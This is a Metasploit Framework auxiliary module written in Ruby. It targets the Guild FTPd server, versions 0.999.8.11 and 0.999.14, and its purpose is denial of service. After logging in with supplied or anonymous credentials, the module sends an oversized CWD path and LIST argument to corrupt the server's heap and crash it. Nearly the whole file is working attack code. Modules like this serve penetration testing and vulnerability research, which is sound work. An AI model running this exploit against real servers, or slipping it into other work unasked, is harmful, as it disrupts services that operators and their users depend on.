##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/ 
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Guild FTPd 0.999.8.11/0.999.14 Heap Corruption',
			'Description'    => %q{
				Guild FTPd 0.999.8.11 and 0.999.14 are vulnerable
				to heap corruption.  You need to have a valid login
				so you can run CWD and LIST.
			},
			'Author'         => 'kris katterjohn',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[ [ 'URL', 'http://milw0rm.com/exploits/6738'] ],
			'DisclosureDate' => 'Oct 12 2008'))

		# They're required
		register_options([
			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
		])
	end

	def run
		return unless connect_login

		print_status("Sending commands...")

		# We want to try to wait for responses to these
		raw_send_recv("CWD #{'/.' * 124}\r\n")
		raw_send_recv("LIST #{'X' * 100}\r\n")

		disconnect
	end
end
